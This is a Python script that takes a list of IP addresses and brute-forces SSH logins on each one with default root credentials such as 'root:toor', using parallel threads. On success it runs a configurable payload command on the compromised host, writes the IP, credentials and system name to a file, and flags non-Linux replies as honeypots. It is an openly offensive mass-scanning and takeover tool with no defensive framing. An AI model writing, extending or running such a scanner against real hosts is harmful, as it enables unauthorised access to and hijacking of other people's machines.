import threading, sys, paramiko, time

ips = open(sys.argv[1],'r').read().splitlines()
filee = sys.argv[2]
payload = 'uname'

def sshconn(filename, ip, payload):
  combo = [ 
	"root:root",
  "root:password",
	"root:toor",
]
  paramiko.util.log_to_file("/dev/null", level = "INFO")
  client = paramiko.SSHClient()
  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    for auths in combo:
      auths = auths.split(":")
      client.connect(str(ip), port=22, username=auths[0], password=auths[1])
      stdin, stdout, stderr = client.exec_command('uname')
      name = stdout.read().decode()
      if 'Linux' in name:
        name = name.replace("\n", "")
        print('[FOUND] '+auths,ip,name)
        stdin, stdout, stderr = client.exec_command(payload)
        f = open(filename, "w")
        f.close()
        f = open(filename, "a")
        f.write(f'{ip} {auths} {name}')
        f.close()
      else:
        name = name.replace("\n", "")
        print(ip+' Honeypot '+name)
      stdin.close()
      stdout.close()
      stderr.close()
      client.close()
  except paramiko.AuthenticationException:
    #print(ip,'Wrong Pass')
    client.close()
  except:
    client.close()
  
if __name__ == "__main__":
  for ip in ips:
    x = threading.Thread(target=sshconn, args=(filee,ip, payload)).start()
